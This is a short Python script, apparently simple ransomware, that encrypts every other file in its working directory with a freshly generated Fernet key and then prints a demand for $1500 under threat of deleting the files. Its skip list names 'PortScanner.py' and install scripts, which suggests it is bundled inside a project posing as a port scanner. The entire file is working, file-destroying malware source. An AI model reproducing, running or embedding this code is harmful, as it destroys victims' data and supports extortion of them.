import os
from cryptography.fernet import Fernet

#let's find some files

files = []

for file in os.listdir():
        if file == "PortScanner.py"or file == "thekey.key" or file == "requirements.sh" or file == "install.sh" or  file == "decrypt.py":
                continue
        if os.path.isfile(file):
                files.append(file)

print(files)


key = Fernet.generate_key()

with open (".thekey.key","wb") as thekey:
        thekey.write(key)

for file in files:
        with open(file, "rb") as thefile:
                contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file,"wb") as thefile:
                thefile.write(contents_encrypted)

print("All of your file have been encryptd!! send me $1500 to this address [address] or I'll delete em all")

